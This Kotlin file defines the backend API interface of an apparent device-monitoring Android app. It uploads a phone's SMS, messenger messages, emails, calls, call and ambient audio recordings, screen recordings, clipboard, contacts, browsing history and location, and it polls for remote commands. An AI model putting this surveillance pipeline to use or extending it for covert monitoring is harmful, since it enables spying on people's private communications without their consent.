package com.devicemonitor.data.api

import com.devicemonitor.data.models.AmbientRecording
import com.devicemonitor.data.models.AppUsage
import com.devicemonitor.data.models.CallLogEntry
import com.devicemonitor.data.models.CallRecording
import com.devicemonitor.data.models.ClipboardEntry
import com.devicemonitor.data.models.ContactEntry
import com.devicemonitor.data.models.DeviceInfo
import com.devicemonitor.data.models.EmailEntry
import com.devicemonitor.data.models.LocationEntry
import com.devicemonitor.data.models.MessengerMessage
import com.devicemonitor.data.models.NetworkInfo
import com.devicemonitor.data.models.RemoteCommand
import com.devicemonitor.data.models.RiskAlert
import com.devicemonitor.data.models.ScreenRecording
import com.devicemonitor.data.models.SmsEntry
import com.devicemonitor.data.models.WebHistory
import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.POST
import retrofit2.http.Query

interface SupabaseApi {

    @POST("locations")
    suspend fun insertLocation(@Body location: LocationEntry): Response<Unit>

    @POST("call_logs")
    suspend fun insertCallLog(@Body callLog: CallLogEntry): Response<Unit>

    @POST("sms")
    suspend fun insertSms(@Body sms: SmsEntry): Response<Unit>

    @POST("messenger_messages")
    suspend fun insertMessengerMessage(@Body message: MessengerMessage): Response<Unit>

    @POST("app_usage")
    suspend fun insertAppUsage(@Body usage: AppUsage): Response<Unit>

    @POST("network_info")
    suspend fun insertNetworkInfo(@Body networkInfo: NetworkInfo): Response<Unit>

    @POST("device_info")
    suspend fun insertDeviceInfo(@Body deviceInfo: DeviceInfo): Response<Unit>

    @POST("clipboard_entries")
    suspend fun insertClipboardEntry(@Body clipboardEntry: ClipboardEntry): Response<Unit>

    @POST("web_history")
    suspend fun insertWebHistory(@Body webHistory: WebHistory): Response<Unit>

    @POST("ambient_recordings")
    suspend fun insertAmbientRecording(@Body recording: AmbientRecording): Response<Unit>

    @POST("screen_recordings")
    suspend fun insertScreenRecording(@Body recording: ScreenRecording): Response<Unit>

    @POST("risk_alerts")
    suspend fun insertRiskAlert(@Body alert: RiskAlert): Response<Unit>

    @POST("contacts")
    suspend fun insertContact(@Body contact: ContactEntry): Response<Unit>

    @POST("call_recordings")
    suspend fun insertCallRecording(@Body recording: CallRecording): Response<Unit>

    @POST("email_entries")
    suspend fun insertEmailEntry(@Body entry: EmailEntry): Response<Unit>

    @GET("commands")
    suspend fun getPendingCommands(
        @Query("device_id") deviceId: String,
        @Query("status") status: String = "pending",
        @Query("order") order: String = "created_at.asc"
    ): Response<List<RemoteCommand>>

    @POST("commands")
    suspend fun updateCommandStatus(@Body command: RemoteCommand): Response<Unit>
}
